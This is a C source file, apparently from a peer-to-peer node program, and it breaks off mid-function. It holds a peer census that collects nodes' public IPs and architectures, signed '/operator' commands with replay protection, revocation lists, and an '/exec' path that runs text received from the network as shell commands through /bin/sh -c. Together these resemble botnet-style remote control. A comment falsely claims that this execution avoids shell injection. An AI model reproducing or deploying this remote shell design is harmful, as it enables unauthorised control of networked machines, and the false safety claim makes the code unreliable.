#include "common.h"
#include "guard.h"
#include "overlay.h"
#include "hasher.h"
#include <errno.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <signal.h>
#include <unistd.h>

// color codes
#define C_RESET  "\033[0m"
#define C_GREEN  "\033[32m"
#define C_BLUE   "\033[34m"

#define NETPEERS_REQUEST_ID_BYTES 16
#define NETPEERS_REQUEST_ID_HEX   (NETPEERS_REQUEST_ID_BYTES * 2)
#define NETPEERS_WINDOW_DEFAULT   20
#define NETPEERS_WINDOW_MIN       8
#define NETPEERS_WINDOW_MAX       40
#define NETPEERS_ROUND_INTERVAL   3
#define NETPEERS_ROUND_MAX        16
#define NETPEERS_TTL              10
#define NETPEERS_MAX_RESULTS      256
#define NETPEERS_SEEN_REQ_MAX     128
#define NETPEERS_SEEN_REQ_TTL     45


static void pubkey_short_hex(const uint8_t pubkey[CRYPTO_PUBKEY_LEN],
                             char out[17])
{
    static const char hex[] = "0123456789abcdef";
    for (int i = 0; i < 8; i++) {
        out[i * 2]     = hex[pubkey[i] >> 4];
        out[i * 2 + 1] = hex[pubkey[i] & 0x0f];
    }
    out[16] = '\0';
}

static void bytes_to_hex_local(const uint8_t *in, size_t len, char *out)
{
    static const char hex[] = "0123456789abcdef";
    for (size_t i = 0; i < len; i++) {
        out[i * 2]     = hex[in[i] >> 4];
        out[i * 2 + 1] = hex[in[i] & 0x0f];
    }
    out[len * 2] = '\0';
}

static bool p2p_broadcast_wire_message_ttl(const char *wire_msg, uint8_t ttl);

typedef struct {
    bool used;
    char request_id[NETPEERS_REQUEST_ID_HEX + 1];
    int round;
    time_t seen_at;
} netpeers_seen_req_t;

typedef struct {
    char node_key[CRYPTO_PUBKEY_LEN * 2 + 1];
    char node_id[32];
    char arch[16];
    int active_count;
    int passive_count;
    long uptime;
    long start_time;
    int first_round;
    int last_round;
    int seen_count;
} netpeers_result_t;

typedef struct {
    bool active;
    char request_id[NETPEERS_REQUEST_ID_HEX + 1];
    time_t started_at;
    time_t next_probe_at;
    int window_secs;
    int next_round;
    int rounds_planned;
    uint8_t ttl;
    int responses_seen;
    int probes_sent;
    netpeers_result_t results[NETPEERS_MAX_RESULTS];
    int result_count;
} netpeers_census_t;

static netpeers_seen_req_t netpeers_seen_reqs[NETPEERS_SEEN_REQ_MAX];
static netpeers_census_t netpeers_census;
static char last_admin_error[256];

static void p2p_clear_admin_error(void)
{
    last_admin_error[0] = '\0';
}

static void p2p_set_admin_error(const char *msg)
{
    snprintf(last_admin_error, sizeof(last_admin_error), "%s",
             msg ? msg : "");
}

const char *p2p_last_admin_error(void)
{
    return last_admin_error[0] ? last_admin_error : NULL;
}

static uint8_t netpeers_effective_ttl(void)
{
    return (NETPEERS_TTL > P2P_BROADCAST_TTL_MAX)
           ? (uint8_t)P2P_BROADCAST_TTL_MAX
           : (uint8_t)NETPEERS_TTL;
}

static bool netpeers_request_id_is_valid(const char *id)
{
    if (!id || strlen(id) != NETPEERS_REQUEST_ID_HEX) return false;
    for (size_t i = 0; i < NETPEERS_REQUEST_ID_HEX; i++) {
        char c = id[i];
        if (!((c >= '0' && c <= '9') ||
              (c >= 'a' && c <= 'f') ||
              (c >= 'A' && c <= 'F')))
            return false;
    }
    return true;
}

static bool netpeers_seen_request(const char *request_id, int round, time_t now)
{
    int free_slot = -1;
    int oldest_slot = 0;

    if (round < 0) round = 0;
    for (int i = 0; i < NETPEERS_SEEN_REQ_MAX; i++) {
        if (!netpeers_seen_reqs[i].used) {
            if (free_slot < 0) free_slot = i;
            continue;
        }
        if (now - netpeers_seen_reqs[i].seen_at > NETPEERS_SEEN_REQ_TTL) {
            netpeers_seen_reqs[i].used = false;
            if (free_slot < 0) free_slot = i;
            continue;
        }
        if (netpeers_seen_reqs[i].round == round &&
            strcmp(netpeers_seen_reqs[i].request_id, request_id) == 0)
            return true;
        if (netpeers_seen_reqs[i].seen_at < netpeers_seen_reqs[oldest_slot].seen_at)
            oldest_slot = i;
    }

    int slot = free_slot >= 0 ? free_slot : oldest_slot;
    netpeers_seen_reqs[slot].used = true;
    netpeers_seen_reqs[slot].round = round;
    netpeers_seen_reqs[slot].seen_at = now;
    snprintf(netpeers_seen_reqs[slot].request_id,
             sizeof(netpeers_seen_reqs[slot].request_id), "%s", request_id);
    return false;
}

static bool netpeers_local_node_key(char out[CRYPTO_PUBKEY_LEN * 2 + 1])
{
    if (!out || !my_ed25519_pubkey_configured) return false;
    bytes_to_hex_local(my_ed25519_pubkey, CRYPTO_PUBKEY_LEN, out);
    return true;
}

static bool netpeers_find_public_iface(char out[32])
{
    struct ifaddrs *ifaddr = NULL;
    bool found = false;

    if (!out || getifaddrs(&ifaddr) != 0) return false;
    for (struct ifaddrs *ifa = ifaddr; ifa; ifa = ifa->ifa_next) {
        struct sockaddr_in *sa;
        char ip[INET_ADDRSTRLEN];

        if (!ifa->ifa_addr || ifa->ifa_addr->sa_family != AF_INET) continue;
        sa = (struct sockaddr_in *)ifa->ifa_addr;
        if (!p2p_ipv4_is_public(sa->sin_addr.s_addr)) continue;
        if (!inet_ntop(AF_INET, &sa->sin_addr, ip, sizeof(ip))) continue;

        int n = snprintf(out, 32, "%s:%u", ip,
                         (unsigned)my_listen_port);
        found = n > 0 && n < 32;
        break;
    }
    freeifaddrs(ifaddr);
    return found;
}

static bool netpeers_local_node_id(char out[32])
{
    if (!out) return false;
    
    if (netpeers_find_public_iface(out))
        return true;

    snprintf(out, 32, "no-public-ip:%d", my_listen_port);
    return true;
}

static bool netpeers_build_response(const char *request_id, int round,
                                    char out[HPV_PKT_MAX])
{
    char node_key[CRYPTO_PUBKEY_LEN * 2 + 1];
    char node_id[32];
    long uptime = 0;
    time_t now = time(NULL);

    if (!request_id || !out) return false;
    if (!netpeers_local_node_key(node_key)) return false;
    if (!netpeers_local_node_id(node_id)) return false;
    if (my_node_start_time > 0 && now >= my_node_start_time)
        uptime = (long)(now - my_node_start_time);

    int n = snprintf(out, HPV_PKT_MAX,
                     "NETPEERS_RESP2 %s %d %s %s %s %d %d %ld %ld",
                     request_id, round, node_key, node_id, my_arch, as_count,
                     ps_count, uptime, (long)my_node_start_time);
    return n > 0 && n < HPV_PKT_MAX;
}

static bool netpeers_send_response(const char *request_id, int round, uint8_t ttl,
                                   char response_out[HPV_PKT_MAX])
{
    char response[HPV_PKT_MAX];
    if (!netpeers_build_response(request_id, round, response))
        return false;
    if (response_out)
        snprintf(response_out, HPV_PKT_MAX, "%s", response);
    return p2p_broadcast_wire_message_ttl(response, ttl);
}

static bool netpeers_parse_response(const char *text,
                                    char request_id[NETPEERS_REQUEST_ID_HEX + 1],
                                    netpeers_result_t *out)
{
    char extra;
    /* FIX 7: bigger buffer for %32s + \0 */
    char parsed_request[NETPEERS_REQUEST_ID_HEX + 2];
    netpeers_result_t result;
    int n;

    if (!text || !request_id || !out) return false;
    memset(&result, 0, sizeof(result));
    n = sscanf(text, "NETPEERS_RESP2 %32s %d %64s %31s %15s %d %d %ld %ld %c",
               parsed_request, &result.last_round, result.node_key,
               result.node_id, result.arch, &result.active_count,
               &result.passive_count, &result.uptime, &result.start_time,
               &extra);
    if (n == 9) {
        if (!netpeers_request_id_is_valid(parsed_request)) return false;
        if (strlen(result.node_key) != CRYPTO_PUBKEY_LEN * 2) return false;
        if (result.last_round < 0 || result.active_count < 0 ||
            result.passive_count < 0 || result.uptime < 0 ||
            result.start_time < 0)
            return false;
        result.first_round = result.last_round;
        result.seen_count = 1;
    } else {
        memset(&result, 0, sizeof(result));
        n = sscanf(text, "NETPEERS_RESP %32s %31s %15s %d %d %ld %c",
                   parsed_request, result.node_id, result.arch,
                   &result.active_count, &result.passive_count,
                   &result.uptime, &extra);
        if (n != 6) return false;
        if (!netpeers_request_id_is_valid(parsed_request)) return false;
        if (result.active_count < 0 || result.passive_count < 0 ||
            result.uptime < 0)
            return false;
        snprintf(result.node_key, sizeof(result.node_key), "%s", result.node_id);
        result.first_round = 0;
        result.last_round = 0;
        result.seen_count = 1;
    }
    memcpy(request_id, parsed_request, NETPEERS_REQUEST_ID_HEX);
    request_id[NETPEERS_REQUEST_ID_HEX] = '\0';
    *out = result;
    return true;
}

static void netpeers_record_response_text(const char *text)
{
    char request_id[NETPEERS_REQUEST_ID_HEX + 1];
    netpeers_result_t result;

    if (!netpeers_census.active) return;
    if (!netpeers_parse_response(text, request_id, &result)) return;
    if (strcmp(request_id, netpeers_census.request_id) != 0) return;

    netpeers_census.responses_seen++;

    for (int i = 0; i < netpeers_census.result_count; i++) {
        if (strcmp(netpeers_census.results[i].node_key, result.node_key) == 0) {
            int seen_count = netpeers_census.results[i].seen_count;
            int first_round = netpeers_census.results[i].first_round;
            
            if (result.last_round >= netpeers_census.results[i].last_round) {
                netpeers_census.results[i] = result;
                netpeers_census.results[i].seen_count = seen_count + 1;
                netpeers_census.results[i].first_round = first_round;
            } else {
                netpeers_census.results[i].seen_count++;
            }
            return;
        }
    }

    if (netpeers_census.result_count >= NETPEERS_MAX_RESULTS) {
        net_log("census full, discarding peer");
        return;
    }
    
    result.first_round = result.last_round;
    result.seen_count = 1;
    netpeers_census.results[netpeers_census.result_count++] = result;
}

static void netpeers_handle_request_text(const char *text)
{
    char request_id[NETPEERS_REQUEST_ID_HEX + 1];
    char extra;
    int round = 0;

    if (!text) return;
    if (strncmp(text, "NETPEERS_REQ2 ", 14) == 0) {
        if (sscanf(text, "NETPEERS_REQ2 %32s %d %c",
                   request_id, &round, &extra) != 2)
            return;
    } else if (sscanf(text, "NETPEERS_REQ %32s %c", request_id, &extra) != 1) {
            return;
    }
    if (!netpeers_request_id_is_valid(request_id))
        return;
    if (round < 0 || round > NETPEERS_ROUND_MAX)
        return;
    if (netpeers_seen_request(request_id, round, time(NULL)))
        return;
    if (!netpeers_send_response(request_id, round, netpeers_effective_ttl(), NULL)) {
        net_log("could not respond req=%s", request_id);
    }
}

static bool parse_sig_hex_local(const char *hex,
                                uint8_t out[CRYPTO_SIG_LEN])
{
    if (!hex || strlen(hex) != CRYPTO_SIG_LEN * 2) return false;
    for (int i = 0; i < CRYPTO_SIG_LEN; i++) {
        unsigned int hi, lo;
        if (sscanf(hex + i * 2, "%1x%1x", &hi, &lo) != 2)
            return false;
        out[i] = (uint8_t)((hi << 4) | lo);
    }
    return true;
}

static bool parse_sha256_hex_local(const char *hex, uint8_t out[32])
{
    if (!hex || strlen(hex) != 64) return false;
    for (int i = 0; i < 32; i++) {
        unsigned int hi, lo;
        if (sscanf(hex + i * 2, "%1x%1x", &hi, &lo) != 2)
            return false;
        out[i] = (uint8_t)((hi << 4) | lo);
    }
    return true;
}

static bool parse_pubkey_hex_local(const char *hex,
                                   uint8_t out[CRYPTO_PUBKEY_LEN])
{
    if (!hex || strlen(hex) != CRYPTO_PUBKEY_LEN * 2) return false;
    for (int i = 0; i < CRYPTO_PUBKEY_LEN; i++) {
        unsigned int hi, lo;
        if (sscanf(hex + i * 2, "%1x%1x", &hi, &lo) != 2)
            return false;
        out[i] = (uint8_t)((hi << 4) | lo);
    }
    return true;
}

#define NODE_MODULE_REVOKE_PATH  "modules/.module-revocations"
#define NODE_CONTROL_REVOKE_PATH "modules/.control-key-revocations"
#define NODE_REVOKED_MODULE_MAX  256
#define NODE_REVOKED_CONTROL_MAX 64

static uint8_t revoked_module_sha256[NODE_REVOKED_MODULE_MAX][32];
static size_t  revoked_module_count = 0;
static uint8_t revoked_control_pubkeys[NODE_REVOKED_CONTROL_MAX][CRYPTO_PUBKEY_LEN];
static size_t  revoked_control_count = 0;
static pthread_mutex_t revocation_mutex = PTHREAD_MUTEX_INITIALIZER;

static bool revocation_file_has_hex(const char *path, const char *hex,
                                    size_t hex_len)
{
    if (!path || !hex || hex_len == 0) return false;

    bool found = false;
    pthread_mutex_lock(&revocation_mutex);
    if (strcmp(path, NODE_MODULE_REVOKE_PATH) == 0 && hex_len == 64) {
        uint8_t digest[32];
        if (parse_sha256_hex_local(hex, digest)) {
            for (size_t i = 0; i < revoked_module_count; i++) {
                if (memcmp(revoked_module_sha256[i], digest, sizeof(digest)) == 0) {
                    found = true;
                    break;
                }
            }
        }
        p2p_secure_wipe(digest, sizeof(digest));
    } else if (strcmp(path, NODE_CONTROL_REVOKE_PATH) == 0 &&
               hex_len == CRYPTO_PUBKEY_LEN * 2) {
        uint8_t pubkey[CRYPTO_PUBKEY_LEN];
        if (parse_pubkey_hex_local(hex, pubkey)) {
            for (size_t i = 0; i < revoked_control_count; i++) {
                if (memcmp(revoked_control_pubkeys[i], pubkey,
                           sizeof(pubkey)) == 0) {
                    found = true;
                    break;
                }
            }
        }
        p2p_secure_wipe(pubkey, sizeof(pubkey));
    }
    pthread_mutex_unlock(&revocation_mutex);
    return found;
}

static bool module_sha256_is_revoked_hex(const char *sha_hex)
{
    return revocation_file_has_hex(NODE_MODULE_REVOKE_PATH, sha_hex, 64);
}

static bool module_sha256_is_revoked(const uint8_t sha256[32])
{
    char hex[65];
    bytes_to_hex_local(sha256, 32, hex);
    return module_sha256_is_revoked_hex(hex);
}

bool p2p_module_sha256_is_revoked(const uint8_t sha256[32])
{
    if (!sha256) return false;
    return module_sha256_is_revoked(sha256);
}

static bool control_pubkey_is_revoked(const uint8_t pubkey[CRYPTO_PUBKEY_LEN])
{
    char hex[CRYPTO_PUBKEY_LEN * 2 + 1];
    bytes_to_hex_local(pubkey, CRYPTO_PUBKEY_LEN, hex);
    return revocation_file_has_hex(NODE_CONTROL_REVOKE_PATH, hex,
                                   CRYPTO_PUBKEY_LEN * 2);
}

static bool active_control_key_is_revoked(void)
{
    uint8_t pubkey[CRYPTO_PUBKEY_LEN];
    bool revoked = false;
    if (!crypto_control_get_pubkey(pubkey)) return false;
    revoked = control_pubkey_is_revoked(pubkey);
    p2p_secure_wipe(pubkey, sizeof(pubkey));
    return revoked;
}

/* anti-replay v3: random 128bit nonce
 *
 * v2 had counter in ram that reset to 0 on reboot
 * attacker could replay after reboot cause counter had no persistent state
 *
 * fixed: each command has 128bit nonce from crypto_random_bytes
 * receiver keeps ram table of seen nonces during window
 * seen nonce = rejected even with valid sig
 *
 * signed format (v3): "node-cmd-v3 <nonce_hex32> <timestamp> <cmd>"
 * wire format: "/operator <nonce_hex32> <timestamp> <sig_hex128> <cmd>"
 */

#define NODE_CMD_MAX_AGE_SECS     300
#define NODE_CMD_FUTURE_SKEW_SECS 300
#define NODE_CMD_NONCE_BYTES      16
#define NODE_CMD_NONCE_HEX        32
#define NODE_NONCE_TABLE_MAX      4096

typedef struct {
    uint8_t  nonce[NODE_CMD_NONCE_BYTES];
    time_t   seen_at;
    bool     used;
} nonce_entry_t;

static nonce_entry_t   nonce_table[NODE_NONCE_TABLE_MAX];
static pthread_mutex_t nonce_table_mutex = PTHREAD_MUTEX_INITIALIZER;
static bool            nonce_table_loaded = false;

static bool nonce_seen_locked(const uint8_t nonce[NODE_CMD_NONCE_BYTES],
                              time_t now)
{
    for (int i = 0; i < NODE_NONCE_TABLE_MAX; i++) {
        if (!nonce_table[i].used) continue;
        if (now - nonce_table[i].seen_at > NODE_CMD_MAX_AGE_SECS) {
            nonce_table[i].used = false;
            continue;
        }
        if (memcmp(nonce_table[i].nonce, nonce, NODE_CMD_NONCE_BYTES) == 0)
            return true;
    }
    return false;
}

static void nonce_record_locked(const uint8_t nonce[NODE_CMD_NONCE_BYTES],
                                time_t now)
{
    int free_slot = -1;
    int oldest_slot = 0;

    for (int i = 0; i < NODE_NONCE_TABLE_MAX; i++) {
        if (!nonce_table[i].used) {
            if (free_slot < 0) free_slot = i;
            continue;
        }
        if (now - nonce_table[i].seen_at > NODE_CMD_MAX_AGE_SECS) {
            nonce_table[i].used = false;
            if (free_slot < 0) free_slot = i;
            continue;
        }
        if (nonce_table[i].seen_at < nonce_table[oldest_slot].seen_at)
            oldest_slot = i;
    }

    int slot = (free_slot >= 0) ? free_slot : oldest_slot;
    memcpy(nonce_table[slot].nonce, nonce, NODE_CMD_NONCE_BYTES);
    nonce_table[slot].seen_at = now;
    nonce_table[slot].used    = true;
}

static void nonce_cache_compact_locked(time_t now)
{
    for (int i = 0; i < NODE_NONCE_TABLE_MAX; i++) {
        if (!nonce_table[i].used) continue;
        if (now - nonce_table[i].seen_at > NODE_CMD_MAX_AGE_SECS) {
            nonce_table[i].used = false;
        }
    }
}

static void nonce_cache_load_locked(time_t now)
{
    if (nonce_table_loaded) return;
    nonce_table_loaded = true;
    nonce_cache_compact_locked(now);
}



static bool nonce_accept_and_record(const uint8_t nonce[NODE_CMD_NONCE_BYTES])
{
    time_t now = time(NULL);
    pthread_mutex_lock(&nonce_table_mutex);
    nonce_cache_load_locked(now);
    if (nonce_seen_locked(nonce, now)) {
        pthread_mutex_unlock(&nonce_table_mutex);
        return false;
    }

    nonce_record_locked(nonce, now);
    nonce_cache_compact_locked(now);

    pthread_mutex_unlock(&nonce_table_mutex);

    return true;
}

static bool admin_timestamp_accept(long command_ts)
{
    time_t local_now = time(NULL);
    time_t net_now = p2p_network_time();
    bool local_ok = command_ts > 0 &&
                    command_ts >= (long)local_now - NODE_CMD_MAX_AGE_SECS &&
                    command_ts <= (long)local_now + NODE_CMD_FUTURE_SKEW_SECS;
    bool net_ok = command_ts > 0 &&
                  command_ts >= (long)net_now - NODE_CMD_MAX_AGE_SECS &&
                  command_ts <= (long)net_now + NODE_CMD_FUTURE_SKEW_SECS;
    if (!local_ok && !net_ok) {
        net_log("cmd rejected ts outside window cmd=%ld local=%ld net=%ld",
                command_ts, (long)local_now, (long)net_now);
        return false;
    }
    return true;
}

static bool build_node_command_payload_v3(const uint8_t nonce[NODE_CMD_NONCE_BYTES],
                                          long ts, const char *cmd,
                                          char *out, size_t out_len)
{
    char nonce_hex[NODE_CMD_NONCE_HEX + 1];
    bytes_to_hex_local(nonce, NODE_CMD_NONCE_BYTES, nonce_hex);
    int n = snprintf(out, out_len, "node-cmd-v3 %s %ld %s",
                     nonce_hex, ts, cmd ? cmd : "");
    return n >= 0 && n < (int)out_len;
}

/* add clock offset sample to peer's ring buffer */
void p2p_clock_add_sample(int peer_idx, int64_t offset_secs)
{
    if (peer_idx < 0 || peer_idx >= as_count || !as[peer_idx]) return;
    active_node_t *n = as[peer_idx];
    n->clock_samples[n->clock_sample_head] = offset_secs;
    n->clock_sample_seen[n->clock_sample_head] = time(NULL);
    n->clock_sample_head = (n->clock_sample_head + 1) % CLOCK_SAMPLES_MAX;
    if (n->clock_sample_count < CLOCK_SAMPLES_MAX)
        n->clock_sample_count++;
    n->clock_offset_valid = true;
}

static int cmp_int64(const void *a, const void *b)
{
    int64_t x = *(const int64_t *)a;
    int64_t y = *(const int64_t *)b;
    return (x > y) - (x < y);
}

time_t p2p_network_time(void)
{
#define PEER_TIME_SAMPLES_MAX CLOCK_SAMPLES_MAX
    int64_t peer_offsets[AS_MAX];
    int     peer_total = 0;
    time_t  now = time(NULL);

    for (int i = 0; i < as_count; i++) {
        if (!as[i] || !as[i]->clock_offset_valid) continue;
        int64_t peer_samples[PEER_TIME_SAMPLES_MAX];
        int peer_count = 0;
        int cnt = as[i]->clock_sample_count;
        for (int j = 0; j < cnt && peer_count < PEER_TIME_SAMPLES_MAX; j++) {
            time_t seen = as[i]->clock_sample_seen[j];
            if (seen <= 0 || now < seen ||
                now - seen > CLOCK_SAMPLE_MAX_AGE_SECS)
                continue;
            peer_samples[peer_count++] = as[i]->clock_samples[j];
        }
        if (peer_count == 0) {
            as[i]->clock_offset_valid = false;
            continue;
        }
        qsort(peer_samples, (size_t)peer_count, sizeof(int64_t), cmp_int64);
        peer_offsets[peer_total++] = (peer_count % 2 == 1)
                                     ? peer_samples[peer_count / 2]
                                     : (peer_samples[peer_count / 2 - 1] +
                                        peer_samples[peer_count / 2]) / 2;
    }

    if (peer_total == 0)
        return now;

    qsort(peer_offsets, (size_t)peer_total, sizeof(int64_t), cmp_int64);
    int64_t median = (peer_total % 2 == 1)
                     ? peer_offsets[peer_total / 2]
                     : (peer_offsets[peer_total / 2 - 1] +
                        peer_offsets[peer_total / 2]) / 2;

    return (time_t)((int64_t)now - median);
#undef PEER_TIME_SAMPLES_MAX
}

static bool build_node_v2_message(const char *cmd, char *out, size_t out_len)
{
    if (!out || out_len == 0) return false;
    if (!crypto_control_sign_configured()) return false;
    while (cmd && *cmd == ' ') cmd++;
    if (!cmd) cmd = "";

    uint8_t nonce[NODE_CMD_NONCE_BYTES];
    if (!crypto_random_bytes(nonce, sizeof(nonce))) {
        net_log("nonce generation error");
        return false;
    }
    long ts = (long)p2p_network_time();

    char payload[HPV_PKT_MAX];
    if (!build_node_command_payload_v3(nonce, ts, cmd, payload, sizeof(payload)))
        return false;

    uint8_t sig[CRYPTO_SIG_LEN];
    char sig_hex[CRYPTO_SIG_LEN * 2 + 1];
    if (!crypto_control_sign((const uint8_t *)payload, strlen(payload), sig))
        return false;
    bytes_to_hex_local(sig, CRYPTO_SIG_LEN, sig_hex);

    char nonce_hex[NODE_CMD_NONCE_HEX + 1];
    bytes_to_hex_local(nonce, NODE_CMD_NONCE_BYTES, nonce_hex);

    int n = snprintf(out, out_len, "/operator %s %ld %s %s",
                     nonce_hex, ts, sig_hex, cmd);
    return n >= 0 && n < (int)out_len;
}

static bool parse_node_v2(const char *text, uint64_t *counter,
                          long *command_ts, const char **cmd)
{
    if (!text || strncmp(text, "/operator ", 10) != 0) return false;
    const char *p = text + 10;

    if (strlen(p) < NODE_CMD_NONCE_HEX + 1) return false;
    char nonce_hex[NODE_CMD_NONCE_HEX + 1];
    memcpy(nonce_hex, p, NODE_CMD_NONCE_HEX);
    nonce_hex[NODE_CMD_NONCE_HEX] = '\0';
    p += NODE_CMD_NONCE_HEX;
    if (*p != ' ') return false;
    p++;

    uint8_t nonce[NODE_CMD_NONCE_BYTES];
    for (int i = 0; i < NODE_CMD_NONCE_BYTES; i++) {
        unsigned int hi, lo;
        if (sscanf(nonce_hex + i * 2, "%1x%1x", &hi, &lo) != 2) return false;
        nonce[i] = (uint8_t)((hi << 4) | lo);
    }

    char *end = NULL;
    long ts = strtol(p, &end, 10);
    if (end == p || (*end != ' ' && *end != '\0')) return false;
    while (*end == ' ') end++;
    if (*end == '\0') return false;

    char sig_hex[CRYPTO_SIG_LEN * 2 + 1];
    size_t sig_len = strcspn(end, " ");
    if (sig_len != CRYPTO_SIG_LEN * 2) return false;
    memcpy(sig_hex, end, sig_len);
    sig_hex[sig_len] = '\0';
    end += sig_len;
    if (*end != ' ') return false;
    while (*end == ' ') end++;
    if (*end == '\0') return false;

    uint8_t sig[CRYPTO_SIG_LEN];
    if (!parse_sig_hex_local(sig_hex, sig)) return false;

    char payload[HPV_PKT_MAX];
    if (!build_node_command_payload_v3(nonce, ts, end, payload, sizeof(payload)))
        return false;
    if (active_control_key_is_revoked()) {
        net_log("cmd rejected: key revoked");
        return false;
    }
    if (!crypto_control_verify((const uint8_t *)payload, strlen(payload), sig))
        return false;

    if (!admin_timestamp_accept(ts)) return false;

    if (!nonce_accept_and_record(nonce)) {
        net_log("command rejected: nonce used (replay)");
        return false;
    }

    if (counter)    *counter    = 0;
    if (command_ts) *command_ts = ts;
    if (cmd)        *cmd        = end;
    return true;
}

static bool p2p_node_command_from_chat(const char *msg, const char **cmd_out)
{
    if (!msg) return false;
    
    /* Skip leading whitespace */
    while (*msg == ' ' || *msg == '\t') msg++;
    
    /* Check for /exec command */
    if (strncmp(msg, "/exec ", 6) == 0) {
        if (cmd_out) *cmd_out = msg; // Conservar "/exec " completo
        return true;
    }
    
    /* Check for other admin commands */
    if (strncmp(msg, "/operator ", 10) == 0) {
        if (cmd_out) *cmd_out = msg;
        return true;
    }
    
    return false;
}

bool p2p_is_admin_command(const char *msg)
{
    return p2p_node_command_from_chat(msg, NULL);
}

/* Global table to track exec processes */
#define MAX_EXEC_PROCESSES 8
static struct {
    pid_t pid;
    time_t start_time;
    char cmd[256];
} exec_processes[MAX_EXEC_PROCESSES];
static int exec_process_count = 0;
static pthread_mutex_t exec_mutex = PTHREAD_MUTEX_INITIALIZER;

/* Clean up finished exec processes */
void cleanup_exec_processes(void)
{
    pthread_mutex_lock(&exec_mutex);
    
    for (int i = 0; i < exec_process_count; i++) {
        int status;
        pid_t result = waitpid(exec_processes[i].pid, &status, WNOHANG);
        
        if (result == exec_processes[i].pid) {
            /* Process finished */
            if (WIFEXITED(status)) {
                int exit_code = WEXITSTATUS(status);
                net_log("exec: command '%.60s' finished with exit code %d", 
                        exec_processes[i].cmd, exit_code);
            } else if (WIFSIGNALED(status)) {
                int sig = WTERMSIG(status);
                net_log("exec: command '%.60s' killed by signal %d", 
                        exec_processes[i].cmd, sig);
            }
            
            /* Remove from table */
            memmove(&exec_processes[i], &exec_processes[i+1], 
                    (exec_process_count - i - 1) * sizeof(exec_processes[0]));
            exec_process_count--;
            i--; /* Check same index again */
        }
        else if (result < 0 && errno != ECHILD) {
            /* Error other than "no such child" */
            net_log("exec: waitpid error for pid %d: %s", 
                    exec_processes[i].pid, strerror(errno));
        }
    }
    
    /* Kill timed-out processes */
    time_t now = time(NULL);
    for (int i = 0; i < exec_process_count; i++) {
        if (now - exec_processes[i].start_time > 5) { /* 5 second timeout */
            net_log("exec: killing timed-out command '%.60s' (pid %d)", 
                    exec_processes[i].cmd, exec_processes[i].pid);
            
            /* Kill entire process group */
            killpg(exec_processes[i].pid, SIGKILL);
            
            /* Wait to clean up zombie */
            int status;
            waitpid(exec_processes[i].pid, &status, 0);
            
            /* Remove from table */
            memmove(&exec_processes[i], &exec_processes[i+1], 
                    (exec_process_count - i - 1) * sizeof(exec_processes[0]));
            exec_process_count--;
            i--; /* Check same index again */
        }
    }
    
    pthread_mutex_unlock(&exec_mutex);
}

/* Execute shell command with proper process management */
static bool execute_shell_command(const char *cmd, char *output, size_t output_max)
{
    if (!cmd || !output || output_max == 0) return false;
    
    /* Limit command length */
    if (strlen(cmd) > 200) {
        snprintf(output, output_max, "ERROR: command too long (>200 chars)");
        return false;
    }
    
    /* Clean up finished processes first */
    cleanup_exec_processes();
    
    pthread_mutex_lock(&exec_mutex);
    
    /* Check process limit */
    if (exec_process_count >= MAX_EXEC_PROCESSES) {
        pthread_mutex_unlock(&exec_mutex);
        snprintf(output, output_max, "ERROR: too many concurrent exec processes");
        return false;
    }
    
    /* Fork and track the process */
    pid_t pid = fork();
    if (pid < 0) {
        pthread_mutex_unlock(&exec_mutex);
        snprintf(output, output_max, "ERROR: fork failed");
        return false;
    }
    
    if (pid == 0) {
        /* Child: create process group and execute */
        if (setpgid(0, 0) < 0) {
            fprintf(stderr, "setpgid failed\n");
            exit(127);
        }
        
        /* Close unnecessary descriptors */
        for (int i = 3; i < 64; i++) close(i);
        
        /* Execute command - use execl to avoid shell injection */
        execl("/bin/sh", "sh", "-c", cmd, (char *)NULL);
        exit(127); /* execl failed */
    }
    
    /* Parent: add to tracking table */
    exec_processes[exec_process_count].pid = pid;
    exec_processes[exec_process_count].start_time = time(NULL);
    strncpy(exec_processes[exec_process_count].cmd, cmd, 
            sizeof(exec_processes[exec_process_count].cmd) - 1);
    exec_processes[exec_process_count].cmd[sizeof(exec_processes[exec_process_count].cmd) - 1] = '\0';
    exec_process_count++;
    
    pthread_mutex_unlock(&exec_mutex);
    
    snprintf(output, output_max, "Command started (pid %d, tracked)", (int)pid);
    return true;
}

static uint8_t *pkt_alloc(void)
{
    pthread_mutex_lock(&pkt_pool_mutex);
    for (int i = 0; i < PKT_POOL_SIZE; i++) {
        if (!pkt_pool_used[i]) {
            pkt_pool_used[i] = true;
            pthread_mutex_unlock(&pkt_pool_mutex);
            return pkt_pool_mem[i];
        }
    }
    pthread_mutex_unlock(&pkt_pool_mutex);

    return NULL;
}

static void pkt_free(uint8_t *p)
{
    if (!p) return;
    pthread_mutex_lock(&pkt_pool_mutex);
    for (int i = 0; i < PKT_POOL_SIZE; i++) {
        if (pkt_pool_mem[i] == p) {
            pkt_pool_used[i] = false;
            break;
        }
    }
    pthread_mutex_unlock(&pkt_pool_mutex);
}

static bool wbuf_push(write_buf_t *b, const uint8_t *data, size_t len)
{
    uint32_t used  = b->wpos - b->rpos;
    uint32_t avail = WBUF_SIZE - used;
    if ((uint32_t)len > avail) return false;

    uint32_t start = b->wpos % WBUF_SIZE;
    size_t   part1 = WBUF_SIZE - start;
    if (len <= part1) {
        memcpy(b->data + start, data, len);
    } else {
        memcpy(b->data + start, data, part1);
        memcpy(b->data, data + part1, len - part1);
    }
    b->wpos += (uint32_t)len;
    return true;
}

static bool p2p_is_best_effort_packet(const uint8_t *msg, size_t len)
{
    if (!msg || len == 0) return false;
    uint8_t type = msg[0];
    return type == M_PING || type == M_PONG || type == M_SHUFFLE ||
           (type >= M_DHT_PING && type <= M_DHT_STORE_ACK);
}

int wbuf_flush(write_buf_t *b, P2PConn *ssl)
{
    while (b->rpos < b->wpos) {
        uint32_t rmod      = b->rpos % WBUF_SIZE;
        uint32_t pending   = b->wpos - b->rpos;
        uint32_t contig    = WBUF_SIZE - rmod;
        size_t   to_send   = (pending < contig) ? pending : contig;

        int n = p2p_conn_write(ssl, b->data + rmod, (int)to_send);
        if (n <= 0) {
            int err = p2p_conn_get_error(ssl, n);
            if (err == P2PCONN_ERROR_WANT_WRITE || err == P2PCONN_ERROR_WANT_READ)
                return 0;  
            return -1;     
        }
        b->rpos += (uint32_t)n;
    }
    return 1;  
}

bool wbuf_has_data(const write_buf_t *b)
{
    return b->rpos < b->wpos;
}

/* FIXED: Declare peer management mutex for use across files */
pthread_mutex_t peer_mgmt_mutex = PTHREAD_MUTEX_INITIALIZER;

void sndpkt(node_id_t id, uint8_t *msg, size_t len)
{
    /* FIXED: Serialize all peer access, not just sndpkt */
